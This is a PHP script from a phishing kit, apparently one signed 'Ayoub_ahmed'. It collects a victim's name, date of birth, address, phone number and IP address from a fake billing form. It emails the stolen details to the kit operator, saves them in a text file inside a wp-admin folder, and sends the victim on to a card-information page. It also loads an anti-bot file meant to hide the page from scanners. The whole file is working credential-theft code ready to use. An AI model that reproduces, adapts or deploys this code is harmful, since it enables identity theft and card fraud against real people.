<?php


/*

 */
session_start();
include 'antibots.php';
include 'config.php';



$firstname = $_SESSION['legalfirstname'] = $_POST['legalfirstname'];
$lastname = $_SESSION['legallastname'] = $_POST['legallastname'];
$street_adress = $_SESSION['adresse']= $_POST['streetaddress'];
$date_ob = $_POST['date_ob'];
$city = $_SESSION['city'] = $_POST['city'];
$country =$_SESSION['country']= $_POST['country'];
$state = $_SESSION['state'] = $_POST['state'];
$zip_code =$_SESSION['zip'] = $_POST['zip'];
$mobile = $_POST['phonenumber'];
$iP_adress = $_SERVER['REMOTE_ADDR'];

$Info_LOG = "
|================ INFO-Billing ===============|
|First Name       : $firstname
|Last Name        : $lastname
|Date OB          : $date_ob
|Street Adresse   : $street_adress
|City             : $city
|Country          : $country
|state            : $state
|Zip Code         : $zip_code
|Phone Number     : $mobile
|IP Adresse       : $iP_adress
|==============[Ayoub_ahmed]==============|";





// Don't Touche
//Email
if($Send_Email !== 1 ){}else{
    $subject = 'Billing Info : Billing '.$iP_adress.'';
    $headers = 'From: Ayoub_ahmed' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $Info_LOG, $headers);
    header("location:card_info.php?websrc=".md5('Ayoub_ahmed')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}
//FTP
if($Ftp_Write !== 1 ){}else{
    $file = fopen("wp-admin/Result-By-Ahmed_Ayoub." . $IP_Connected . ".txt", 'a');
    fwrite($file, $Info_LOG);
    header("location:card_info.php?websrc=".md5('AHMED_AHMED')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
}



?>